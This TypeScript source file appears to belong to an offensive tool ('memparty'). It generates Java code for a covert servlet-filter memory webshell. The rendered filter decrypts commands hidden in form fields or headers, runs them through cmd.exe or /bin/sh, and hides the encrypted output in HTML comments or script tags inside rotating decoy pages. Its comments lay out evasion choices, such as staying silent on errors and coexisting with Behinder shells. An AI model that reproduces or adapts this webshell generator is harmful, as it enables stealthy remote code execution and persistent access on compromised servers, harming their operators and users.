/**
 * Java source rendering for the mimic filter — the server half of the mimic
 * protocol, generated from a site profile and compiled by `memparty custom
 * build` (see docs/custom-memshell-design.md §B / mimic-memshell-guide.md).
 *
 * The crypto/encoding/padTail snippets below are the Java twins of
 * src/connect/mimic-codecs.ts. They are emitted VERBATIM into both the
 * filter and the CryptoProbe harness (renderCryptoProbe) — the probe is what
 * src/custom/java-probe.test.ts runs to prove the two languages produce
 * byte-compatible wire values. Never edit a snippet in only one place.
 *
 * The filter itself keeps the proven V6 behaviour:
 *   - probe with getParameter()/getHeader() only (never touch the body
 *     stream, so Behinder-style raw-body shells behind us keep working);
 *   - anything that isn't ours falls through chain.doFilter untouched;
 *   - any error answers with the plain cover page (stay quiet);
 *   - the cover pages rotate per response.
 */
import type { MimicCipher } from "../connect/mimic-codecs.js";

export interface FilterTemplateOptions {
  /** Simple class name, e.g. "MimicFilterAb3d" (package is always `mimic`). */
  className: string;
  /** Credential pair — must match the client's --pass/--key at connect time. */
  pass: string;
  secret: string;
  /** Carrier field names (form fields / headers) that may hold the ciphertext. */
  fields: string[];
  /** Cover pages from the site profile (raw HTML, rotated per response). */
  templates: string[];
  cipher: MimicCipher;
}

/** Escape a string for embedding as a Java string literal (non-ASCII -> \uXXXX). */
export function javaStringLiteral(s: string): string {
  return s
    .replaceAll("\\", "\\\\")
    .replaceAll('"', '\\"')
    .replaceAll("\r", "")
    .replaceAll("\n", "\\n")
    // eslint-disable-next-line no-control-regex
    .replaceAll(/[^\x00-\x7f]/g, (ch) => `\\u${ch.codePointAt(0)!.toString(16).padStart(4, "0")}`);
}

// ---------------------------------------------------------------------------
// Shared method snippets — identical in the filter and the CryptoProbe.
// ---------------------------------------------------------------------------

const MD5_METHOD = String.raw`
    static String md5Hex(String s) throws Exception {
        MessageDigest m = MessageDigest.getInstance("MD5");
        byte[] d = m.digest(s.getBytes("UTF-8"));
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
`;

function cryptMethod(algorithm: MimicCipher["algorithm"]): string {
  switch (algorithm) {
    case "aes-ecb":
      return String.raw`
    static byte[] crypt(byte[] data, String key, boolean enc) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(enc ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE,
               new SecretKeySpec(key.getBytes("UTF-8"), "AES"));
        return c.doFinal(data);
    }
`;
    case "aes-cbc":
      return String.raw`
    static byte[] crypt(byte[] data, String key, boolean enc) throws Exception {
        Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec ks = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
        if (enc) {
            byte[] iv = new byte[16];
            new java.security.SecureRandom().nextBytes(iv);
            c.init(Cipher.ENCRYPT_MODE, ks, new IvParameterSpec(iv));
            byte[] ct = c.doFinal(data);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(iv);
            bos.write(ct);
            return bos.toByteArray();
        }
        c.init(Cipher.DECRYPT_MODE, ks, new IvParameterSpec(data, 0, 16));
        return c.doFinal(data, 16, data.length - 16);
    }
`;
    case "xor":
      return String.raw`
    static byte[] crypt(byte[] data, String key, boolean enc) throws Exception {
        byte[] k = key.getBytes("UTF-8");
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) out[i] = (byte) (data[i] ^ k[i % k.length]);
        return out;
    }
`;
  }
}

function encDecMethods(encoding: MimicCipher["encoding"]): string {
  switch (encoding) {
    case "base64":
      return String.raw`
    static String enc(byte[] data) {
        return java.util.Base64.getEncoder().encodeToString(data);
    }
    static byte[] dec(String s) {
        return java.util.Base64.getDecoder().decode(s);
    }
`;
    case "base64url":
      return String.raw`
    static String enc(byte[] data) {
        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }
    static byte[] dec(String s) {
        return java.util.Base64.getUrlDecoder().decode(s);
    }
`;
    case "hex":
      return String.raw`
    static String enc(byte[] data) {
        StringBuilder sb = new StringBuilder();
        for (byte b : data) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
    static byte[] dec(String s) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (int i = 0; i + 1 < s.length(); i += 2) bos.write(Integer.parseInt(s.substring(i, i + 2), 16));
        return bos.toByteArray();
    }
`;
  }
}

/** Behinder aes_with_magic's trick: junk tail of key-derived length (0-15). */
const PAD_METHODS = String.raw`
    static int padLen(String aesKey) throws Exception {
        return Integer.parseInt(md5Hex(aesKey).substring(0, 2), 16) % 16;
    }
    static String appendPad(String s, String aesKey) throws Exception {
        int n = padLen(aesKey);
        StringBuilder sb = new StringBuilder(s);
        java.util.Random r = new java.util.Random();
        for (int i = 0; i < n; i++) {
            sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(r.nextInt(62)));
        }
        return sb.toString();
    }
    static String stripPad(String s, String aesKey) throws Exception {
        int n = padLen(aesKey);
        return n == 0 ? s : s.substring(0, Math.max(0, s.length() - n));
    }
`;

function fieldTransforms(cipher: MimicCipher): string {
  const afterEncode = cipher.padTail ? "appendPad(s, aesKey)" : "s";
  const beforeDecode = cipher.padTail ? "stripPad(v, aesKey)" : "v";
  return `
    static String encryptField(byte[] plain, String aesKey) throws Exception {
        String s = enc(crypt(plain, aesKey, true));
        return ${afterEncode};
    }
    static byte[] decryptField(String v, String aesKey) throws Exception {
        String s = ${beforeDecode};
        return crypt(dec(s), aesKey, false);
    }
`;
}

/** Wrap the ciphertext into the fragment injected into the cover page. */
function wrapPayloadMethod(marker: MimicCipher["marker"]): string {
  if (marker === "html-comment") {
    return String.raw`
    static String wrapPayload(String payload, String passKey) throws Exception {
        return "<!--Re" + md5Hex(passKey).substring(0, 5) + "_config:" + payload + "-->";
    }
`;
  }
  return String.raw`
    static String wrapPayload(String payload, String passKey) throws Exception {
        return "<script>var Re" + md5Hex(passKey).substring(0, 5) + "_config=\"" + payload + "\";</script>";
    }
`;
}

/** All shared snippets in emission order (filter and probe use this order). */
function sharedMethods(cipher: MimicCipher): string {
  return (
    MD5_METHOD +
    cryptMethod(cipher.algorithm) +
    encDecMethods(cipher.encoding) +
    (cipher.padTail ? PAD_METHODS : "") +
    fieldTransforms(cipher)
  );
}

// ---------------------------------------------------------------------------
// The servlet filter (server half of the protocol).
// ---------------------------------------------------------------------------

export function renderFilterJava(opts: FilterTemplateOptions): string {
  const { className, pass, secret, fields, templates, cipher } = opts;
  const fieldsJava = fields.map((f) => `"${javaStringLiteral(f)}"`).join(", ");
  const tplsJava = templates.map((t) => `        "${javaStringLiteral(t)}"`).join(",\n");

  return `package mimic;

import java.io.*;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.*;

/**
 * mimic protocol server (matches src/connect/mimic-codecs.ts):
 *   cipher=${cipher.algorithm} encoding=${cipher.encoding} padTail=${cipher.padTail} marker=${cipher.marker}
 *
 * Detection uses getParameter()/getHeader() only, never reads the body
 * stream: form posts are parsed+cached by the container so downstream
 * getParameter() callers still work, and raw-body posts (Behinder) keep an
 * untouched body stream for the shell behind us. Anything that is not ours
 * falls through chain.doFilter; any error answers with the cover page.
 */
public class ${className} implements Filter {
    /** carriers that may hold the ciphertext (form fields / headers, from the profile) */
    static final String[] FIELDS = { ${fieldsJava} };
    /** credentials — must match the client's --pass/--key (key + marker derivation) */
    static final String PASS = "${javaStringLiteral(pass)}";
    static final String SECRET = "${javaStringLiteral(secret)}";
    /** Cover pages from the site profile — rotated per response so the skin varies. */
    static final String[] TPLS = {
${tplsJava}
    };

    public void init(FilterConfig filterConfig) {}
    public void destroy() {}
${sharedMethods(cipher)}${wrapPayloadMethod(cipher.marker)}
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String value = null;
        for (String f : FIELDS) {
            value = request.getParameter(f);
            if (value == null && request instanceof HttpServletRequest) {
                // secretIn=header: the ciphertext may ride a header instead of a form field
                value = ((HttpServletRequest) request).getHeader(f);
            }
            if (value != null) break;
        }
        if (value == null) {
            chain.doFilter(request, response);
            return;
        }
        String aesKey;
        byte[] cmd;
        try {
            aesKey = md5Hex(SECRET).substring(0, 16);
            cmd = decryptField(value, aesKey);
        } catch (Exception notOurs) {
            // the field exists but doesn't decrypt — this is someone else's
            // legitimate form (e.g. the real login POST), stay invisible
            chain.doFilter(request, response);
            return;
        }
        String tpl = TPLS[new java.util.Random().nextInt(TPLS.length)];
        try {
            String command = new String(cmd, "UTF-8");
            boolean win = System.getProperty("os.name").toLowerCase().contains("win");
            ProcessBuilder pb = win
                ? new ProcessBuilder("cmd.exe", "/c", command)
                : new ProcessBuilder("/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            InputStream in = proc.getInputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
            proc.waitFor();
            String payload = encryptField(bos.toByteArray(), aesKey);
            String fragment = wrapPayload(payload, PASS + SECRET);
            int idx = tpl.toLowerCase().lastIndexOf("</body>");
            String page = idx >= 0 ? tpl.substring(0, idx) + fragment + tpl.substring(idx) : tpl + fragment;
            response.setContentType("text/html;charset=UTF-8");
            response.setCharacterEncoding("UTF-8");
            response.getWriter().write(page);
        } catch (Exception e) {
            // behave like the cover page on any error — stay quiet
            response.setContentType("text/html;charset=UTF-8");
            response.getWriter().write(tpl);
        }
    }
}
`;
}

// ---------------------------------------------------------------------------
// CryptoProbe — a tiny CLI harness around the same snippets, used by the
// cross-language tests: `java CryptoProbe enc|dec <secret> <value>`.
// ---------------------------------------------------------------------------

export function renderCryptoProbe(cipher: MimicCipher): string {
  return `import java.io.*;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/** Cross-language test harness — shares every snippet with the mimic filter. */
public class CryptoProbe {
${sharedMethods(cipher)}
    static String bytesToHex(byte[] data) {
        StringBuilder sb = new StringBuilder();
        for (byte b : data) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
    static byte[] hexToBytes(String s) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (int i = 0; i + 1 < s.length(); i += 2) bos.write(Integer.parseInt(s.substring(i, i + 2), 16));
        return bos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String aesKey = md5Hex(args[1]).substring(0, 16);
        if ("enc".equals(args[0])) {
            // hex plaintext on argv -> wire value on stdout
            System.out.println(encryptField(hexToBytes(args[2]), aesKey));
        } else {
            // wire value on argv -> hex plaintext on stdout
            System.out.println(bytesToHex(decryptField(args[2], aesKey)));
        }
    }
}
`;
}
